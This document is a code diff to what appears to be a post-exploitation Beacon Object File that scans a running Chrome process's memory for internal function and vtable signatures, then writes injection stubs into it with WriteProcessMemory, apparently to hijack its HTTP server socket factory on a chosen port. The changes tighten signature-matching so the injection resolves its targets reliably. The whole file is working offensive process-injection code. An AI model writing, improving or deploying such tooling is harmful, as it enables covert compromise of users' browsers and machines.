@@ -18,6 +18,15 @@
 
 #include "beacon.h"
 
+/* MinGW may lower aggregate initialization to a plain memcpy call even in a
+ * freestanding BOF. Keep the helper in the object so no CRT import is needed. */
+void* memcpy(void* dst, const void* src, size_t len) {
+    volatile unsigned char* d = (volatile unsigned char*)dst;
+    const unsigned char* s = (const unsigned char*)src;
+    for (size_t i = 0; i < len; ++i) d[i] = s[i];
+    return dst;
+}
+
 WINBASEAPI HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
 WINBASEAPI BOOL    WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
 WINBASEAPI BOOL    WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
@@ -39,7 +48,6 @@ WINBASEAPI BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
 WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
 WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryW(LPCWSTR);
 WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
-WINBASEAPI VOID    WINAPI KERNEL32$GetSystemInfo(LPSYSTEM_INFO);
 
 WINUSERAPI HWND    WINAPI USER32$FindWindowA(LPCSTR, LPCSTR);
 WINUSERAPI HWND    WINAPI USER32$FindWindowExA(HWND, HWND, LPCSTR, LPCSTR);
@@ -265,13 +273,6 @@ static const uint8_t CHROME_ENTRY1_MASK[] = {
     1,1,1,0,0,0,0
 };
 
-static void bof_memcpy(void* dst, const void* src, SIZE_T len) {
-    SIZE_T i;
-    unsigned char* d = (unsigned char*)dst;
-    const unsigned char* s = (const unsigned char*)src;
-    for (i = 0; i < len; i++) d[i] = s[i];
-}
-
 static void bof_memset(void* dst, int c, SIZE_T len) {
     SIZE_T i;
     volatile unsigned char* d = (unsigned char*)dst;
@@ -279,7 +280,7 @@ static void bof_memset(void* dst, int c, SIZE_T len) {
 }
 
 static void PatchQword(unsigned char* buf, SIZE_T off, UINT64 value) {
-    bof_memcpy(buf + off, &value, sizeof(value));
+    memcpy(buf + off, &value, sizeof(value));
 }
 
 static int ascii_equals_literal(const char* s, int len, const char* lit) {
@@ -426,45 +427,6 @@ static BOOL GetRemoteSectionInfo(HANDLE hProcess, uint8_t* module_base,
     return (*text_base != NULL && *rdata_base != NULL);
 }
 
-static void* ScanRemoteForSignature(HANDLE hProcess, uint8_t* start, SIZE_T size,
-                                    const uint8_t* sig, const uint8_t* mask, SIZE_T sig_len) {
-    const SIZE_T chunk = 0x10000;
-    SIZE_T offset = 0;
-    uint8_t* buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, chunk + sig_len);
-    if (!buf) return NULL;
-
-    while (offset < size) {
-        SIZE_T to_read = size - offset;
-        SIZE_T read = 0, end, i;
-        if (to_read > chunk) to_read = chunk;
-
-        if (!ReadProcessMemory(hProcess, start + offset, buf, to_read, &read) || read < sig_len) {
-            offset += chunk;
-            continue;
-        }
-
-        end = read - sig_len;
-        for (i = 0; i <= end; i++) {
-            BOOL match = TRUE;
-            SIZE_T j;
-            for (j = 0; j < sig_len && match; j++) {
-                if (!mask || mask[j]) {
-                    if (buf[i + j] != sig[j]) match = FALSE;
-                }
-            }
-            if (match) {
-                void* found = start + offset + i;
-                HeapFree(GetProcessHeap(), 0, buf);
-                return found;
-            }
-        }
-        offset += chunk;
-    }
-
-    HeapFree(GetProcessHeap(), 0, buf);
-    return NULL;
-}
-
 static int CountRemoteSignatureHits(HANDLE hProcess, uint8_t* start, SIZE_T size,
                                     const uint8_t* sig, const uint8_t* mask, SIZE_T sig_len,
                                     uintptr_t* first_hit) {
@@ -479,7 +441,7 @@ static int CountRemoteSignatureHits(HANDLE hProcess, uint8_t* start, SIZE_T size
     while (offset < size) {
         SIZE_T to_read = size - offset;
         SIZE_T read = 0, end, i;
-        if (to_read > chunk) to_read = chunk;
+        if (to_read > chunk + sig_len - 1) to_read = chunk + sig_len - 1;
 
         if (!ReadProcessMemory(hProcess, start + offset, buf, to_read, &read) || read < sig_len) {
             offset += chunk;
@@ -518,10 +480,10 @@ static int ScanRemoteForAllSignatures(HANDLE hProcess, uint8_t* start, SIZE_T si
     uint8_t* buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, chunk + sig_len);
     if (!buf) return 0;
 
-    while (offset < size && count < max_matches) {
+    while (offset < size && count <= max_matches) {
         SIZE_T to_read = size - offset;
         SIZE_T read = 0, end, i;
-        if (to_read > chunk) to_read = chunk;
+        if (to_read > chunk + sig_len - 1) to_read = chunk + sig_len - 1;
 
         if (!ReadProcessMemory(hProcess, start + offset, buf, to_read, &read) || read < sig_len) {
             offset += chunk;
@@ -529,7 +491,7 @@ static int ScanRemoteForAllSignatures(HANDLE hProcess, uint8_t* start, SIZE_T si
         }
 
         end = read - sig_len;
-        for (i = 0; i <= end && count < max_matches; i++) {
+        for (i = 0; i <= end && count <= max_matches; i++) {
             BOOL match = TRUE;
             SIZE_T j;
             for (j = 0; j < sig_len && match; j++) {
@@ -538,7 +500,10 @@ static int ScanRemoteForAllSignatures(HANDLE hProcess, uint8_t* start, SIZE_T si
                 }
             }
             if (match) {
-                out_matches[count++] = (uint64_t)(uintptr_t)(start + offset + i);
+                if (count < max_matches) {
+                    out_matches[count] = (uint64_t)(uintptr_t)(start + offset + i);
+                }
+                count++;
             }
         }
         offset += chunk;
@@ -553,13 +518,15 @@ static void* FindVtableInRdata(HANDLE hProcess, uint8_t* rdata_base, SIZE_T rdat
                                uint8_t* text_base, SIZE_T text_size) {
     const SIZE_T chunk = 0x10000;
     SIZE_T offset = 0;
-    uint8_t* buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, chunk);
+    int hits = 0;
+    void* candidate = NULL;
+    uint8_t* buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, chunk + 8);
     if (!buf) return NULL;
 
-    while (offset < rdata_size) {
+    while (offset < rdata_size && hits <= 1) {
         SIZE_T to_read = rdata_size - offset;
         SIZE_T read = 0, end, i;
-        if (to_read > chunk) to_read = chunk;
+        if (to_read > chunk + 8) to_read = chunk + 8;
 
         if (!ReadProcessMemory(hProcess, rdata_base + offset, buf, to_read, &read) || read < 16) {
             offset += chunk;
@@ -570,59 +537,32 @@ static void* FindVtableInRdata(HANDLE hProcess, uint8_t* rdata_base, SIZE_T rdat
         for (i = 0; i <= end; i += 8) {
             uint64_t first = *(uint64_t*)(buf + i);
             uint64_t second = *(uint64_t*)(buf + i + 8);
-            if (second == entry1_addr && destr_count > 0) {
+            BOOL valid_entry0 = FALSE;
+            if (second != entry1_addr) continue;
+            if (destr_count > 0) {
                 int di;
                 for (di = 0; di < destr_count; di++) {
                     if (first == destr_addrs[di]) {
-                        void* found = rdata_base + offset + i;
-                        HeapFree(GetProcessHeap(), 0, buf);
-                        return found;
+                        valid_entry0 = TRUE;
+                        break;
                     }
                 }
+            }
+            else if (first >= (uint64_t)text_base &&
+                     first < (uint64_t)(text_base + text_size)) {
+                valid_entry0 = TRUE;
+            }
+            if (valid_entry0) {
+                hits++;
+                candidate = rdata_base + offset + i;
+                if (hits > 1) break;
             }
         }
         offset += chunk;
     }
 
-    if (destr_count <= 0) {
-        int hits = 0;
-        void* candidate = NULL;
-
-        offset = 0;
-        while (offset < rdata_size) {
-            SIZE_T to_read = rdata_size - offset;
-            SIZE_T read = 0, end, i;
-            if (to_read > chunk) to_read = chunk;
-
-            if (!ReadProcessMemory(hProcess, rdata_base + offset, buf, to_read, &read) || read < 16) {
-                offset += chunk;
-                continue;
-            }
-
-            end = (read >= 16) ? (read - 16) : 0;
-            for (i = 0; i <= end; i += 8) {
-                uint64_t first = *(uint64_t*)(buf + i);
-                uint64_t second = *(uint64_t*)(buf + i + 8);
-                if (second == entry1_addr &&
-                    first >= (uint64_t)text_base &&
-                    first < (uint64_t)(text_base + text_size)) {
-                    hits++;
-                    candidate = rdata_base + offset + i;
-                    if (hits > 1) break;
-                }
-            }
-            if (hits > 1) break;
-            offset += chunk;
-        }
-
-        if (hits == 1) {
-            HeapFree(GetProcessHeap(), 0, buf);
-            return candidate;
-        }
-    }
-
     HeapFree(GetProcessHeap(), 0, buf);
-    return NULL;
+    return hits == 1 ? candidate : NULL;
 }
 
 static BOOL ResolveSymbolsRuntime(HANDLE hProcess, uintptr_t module_base, const TARGET_CFG* target,
@@ -630,10 +570,12 @@ static BOOL ResolveSymbolsRuntime(HANDLE hProcess, uintptr_t module_base, const 
     uint8_t* text_base = NULL;
     uint8_t* rdata_base = NULL;
     SIZE_T text_size = 0, rdata_size = 0;
-    void* entry1 = NULL;
+    uintptr_t entry1 = 0;
     uint64_t destr_addrs[32];
     int destr_count = 0;
     int start_hits = 0;
+    int new_hits = 0;
+    int entry1_hits = 0;
 
     if (!GetRemoteSectionInfo(hProcess, (uint8_t*)module_base, &text_base, &text_size, &rdata_base, &rdata_size)) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read remote PE sections");
@@ -651,27 +593,37 @@ static BOOL ResolveSymbolsRuntime(HANDLE hProcess, uintptr_t module_base, const 
         return FALSE;
     }
 
-    *chrome_new = (uintptr_t)ScanRemoteForSignature(hProcess, text_base, text_size, OPERATOR_NEW_SIG, OPERATOR_NEW_MASK, sizeof(OPERATOR_NEW_SIG));
-    if (!*chrome_new) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] operator new signature not found");
+    new_hits = CountRemoteSignatureHits(
+        hProcess, text_base, text_size, OPERATOR_NEW_SIG, OPERATOR_NEW_MASK,
+        sizeof(OPERATOR_NEW_SIG), chrome_new);
+    if (new_hits != 1) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] operator new signature must be unique (hits=%d)", new_hits);
         return FALSE;
     }
 
-    entry1 = ScanRemoteForSignature(hProcess, text_base, text_size, target->entry1_sig, target->entry1_mask, target->entry1_sig_len);
-    if (!entry1) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] CreateForHttpServer signature not found");
+    entry1_hits = CountRemoteSignatureHits(
+        hProcess, text_base, text_size, target->entry1_sig, target->entry1_mask,
+        target->entry1_sig_len, &entry1);
+    if (entry1_hits != 1) {
+        BeaconPrintf(CALLBACK_ERROR,
+                     "[-] CreateForHttpServer signature must be unique (hits=%d)",
+                     entry1_hits);
         return FALSE;
     }
 
     destr_count = ScanRemoteForAllSignatures(
         hProcess, text_base, text_size, VTABLE_ENTRY0_SIG, VTABLE_ENTRY0_MASK, sizeof(VTABLE_ENTRY0_SIG),
         destr_addrs, 32);
+    if (destr_count > 32) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] vtable entry-0 signature was too broad (hits>%d)", 32);
+        return FALSE;
+    }
 
     *factory_vtable = (uintptr_t)FindVtableInRdata(
-        hProcess, rdata_base, rdata_size, destr_addrs, destr_count, (uint64_t)(uintptr_t)entry1,
+        hProcess, rdata_base, rdata_size, destr_addrs, destr_count, (uint64_t)entry1,
         text_base, text_size);
     if (!*factory_vtable) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] TCPServerSocketFactory vtable not found");
+        BeaconPrintf(CALLBACK_ERROR, "[-] TCPServerSocketFactory vtable was absent or ambiguous");
         return FALSE;
     }
 
@@ -818,10 +770,10 @@ void go(char* args, int len) {
     wnd_ctx.port = (UINT32)port;
     wnd_ctx.mode = 0;
 
-    bof_memcpy(local_page + 0x000, &install_ctx, sizeof(install_ctx));
-    bof_memcpy(local_page + 0x040, &wnd_ctx, sizeof(wnd_ctx));
-    bof_memcpy(local_page + 0x100, INSTALL_STUB, sizeof(INSTALL_STUB));
-    bof_memcpy(local_page + 0x180, WNDPROC_STUB_TEMPLATE, sizeof(WNDPROC_STUB_TEMPLATE));
+    memcpy(local_page + 0x000, &install_ctx, sizeof(install_ctx));
+    memcpy(local_page + 0x040, &wnd_ctx, sizeof(wnd_ctx));
+    memcpy(local_page + 0x100, INSTALL_STUB, sizeof(INSTALL_STUB));
+    memcpy(local_page + 0x180, WNDPROC_STUB_TEMPLATE, sizeof(WNDPROC_STUB_TEMPLATE));
     PatchQword(local_page + 0x180, 7, (UINT64)wnd_ctx_remote);
 
     if (!WriteProcessMemory(hProcess, remote_mem, local_page, total_size, &written) || written != total_size) {
